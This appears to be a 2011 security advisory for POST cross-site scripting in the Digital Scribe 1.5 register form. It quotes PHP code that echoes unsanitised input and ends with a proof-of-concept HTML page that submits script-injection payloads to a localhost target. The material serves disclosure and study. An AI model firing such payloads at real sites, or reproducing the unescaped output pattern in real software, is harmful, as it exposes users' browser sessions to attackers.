@@ -1,0 +1,88 @@
+<!--
+
+Digital Scribe 1.5 (register_form()) Multiple POST XSS Vulnerabilities
+
+
+Vendor: Digital Scribe
+Product web page: http://www.digital-scribe.org
+Affected version: 1.5
+
+Summary: The Digital Scribe is a free, intuitive system designed
+to help teachers put student work and homework assignments online.
+
+Desc: Digital Scribe suffers from multiple POST XSS vulnerabilities.
+Input thru the POST parameters 'title', 'last' and 'email' in register.php
+is not sanitized allowing the attacker to execute HTML code into user's
+browser session on the affected site.
+
+----------------------------------------------------------------------
+register.php:
+----------------------------------------------------------------------
+
+21: function register_form() {
+22: global $user, $email, $last, $title, $passuno, $passuno2, $_POST, $_GET;
+23: include("access.inc.php");
+24: ?>
+25: <FORM METHOD=POST ACTION=register.php>
+26: <table><tr><td align=right>
+27: Title:</td><td><INPUT TYPE=TEXT NAME=title VALUE="<?php echo ($_POST['title']); ?>" SIZE=4> (Mr., Mrs., etc)
+28: </td></tr>
+29: <tr><td align=right>Last Name:</td><td><INPUT TYPE=TEXT NAME=last VALUE="<?php echo ($_POST['last']); ?>"></td></tr>
+30: <tr><td align=right>Password:</td><td><INPUT TYPE=PASSWORD NAME=passuno></td></tr>
+31: <tr><td>
+32: Password Again:</td><td><INPUT TYPE=passWORD NAME=passuno2></td></tr>
+33: <tr><td align=right>
+34: E-Mail:</td><td><INPUT TYPE=TEXT NAME=email SIZE=34 VALUE=<?php echo $_POST['email'] ?>></td>
+35: </tr><tr><td>
+36: <?php
+37: IF($_GET['type']=='a' OR $_POST['announcements']==4) {
+38: echo '<INPUT TYPE=HIDDEN NAME=announcements VALUE=4>';
+39: }
+
+----------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[28.07.2011] Vulnerabilities discovered.
+[28.07.2011] Initial contact with the vendor.
+[30.07.2011] No reply from vendor.
+[31.07.2011] Public security advisory released.
+
+
+Advisory ID: ZSL-2011-5030
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5030.php
+
+
+28.07.2011
+
+-->
+
+
+<html>
+<title>Digital Scribe 1.5 (register_form()) Multiple POST XSS Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss(){document.forms["xss"].submit();}
+</script>
+<br /><br />
+<form action="http://localhost/digitalscribe/digitalscribe/register.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="title" value='"><script>alert(1)</script>' />
+<input type="hidden" name="last" value='"><script>alert(2)</script>' />
+<input type="hidden" name="email" value='1"><script>alert(3)</script>' />
+<input type="hidden" name="action" value="4" />
+<input type="hidden" name="Submit" value="Register" />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit!</h3></center></font></b></a><br /><br />
+</body></html>
